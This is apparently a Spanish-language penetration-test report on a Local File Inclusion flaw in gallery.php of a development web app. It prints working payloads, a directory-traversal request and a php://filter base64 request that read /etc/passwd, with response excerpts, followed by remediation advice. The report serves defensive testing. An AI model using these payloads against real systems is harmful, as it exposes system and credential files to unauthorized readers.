# Informe: Análisis LFI — Galería de Arte Virtual

Objetivo: http://web.dev.local:8081
Fecha: 2026-04-18T18:22:39Z

Resumen
-------
Se detectó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro `page` de `gallery.php` (también se observó comportamiento similar en `index.php`/`gallery.php` con parámetros `page`/`file`). La vulnerabilidad fue explotada con éxito para leer archivos locales (por ejemplo, /etc/passwd) y obtener su contenido en la respuesta HTTP.

Prueba de concepto (POC)
------------------------
1) Lectura directa de /etc/passwd usando traversal:

GET /gallery.php?page=../../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081

Respuesta (extracto):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...

2) Lectura usando php://filter (base64) para evitar filtros y obtener el contenido codificado:

GET /gallery.php?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081

Respuesta (extracto):
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA== (base64 de /etc/passwd)

Impacto
-------
- Exposición de archivos sensibles del sistema (p. ej. /etc/passwd, archivos de configuración) que pueden contener información para pivotar o escalar privilegios.
- Exposición de credenciales, claves o información de configuración si existen en archivos legibles por el proceso web.

Recomendaciones
---------------
1. Validar y sanitizar entradas: usar una lista blanca de plantillas válidas en lugar de concatenar parámetros en includes. Ejemplo: switch/array mapping de páginas permitidas.
2. Usar funciones seguras: `realpath()` y comparar con un directorio base permitido; rechazar cualquier ruta que salga del árbol previsto.
3. Deshabilitar wrappers peligrosos si no son necesarios (allow_url_include=Off). Considerar `open_basedir` para limitar accesos.
4. Evitar mostrar contenidos crudos en producción; registrar intentos sospechosos y alertar.
5. Revisar código para usos similares de include/require con parámetros controlados por el usuario y corregir.

Evidencia y notas
------------------
- Servidor: Apache/2.4.65, PHP/8.1.33
- Archivos leídos con éxito: /etc/passwd (contenido mostrado arriba).
- Técnicas usadas: directory traversal y php://filter para base64.

Conclusión
----------
Vulnerabilidad LFI confirmada y explotada exitosamente. Se recomienda corrección urgente y revisión de la superficie de ataques de inclusión de archivos.

Firmado: Equipo de pruebas de seguridad
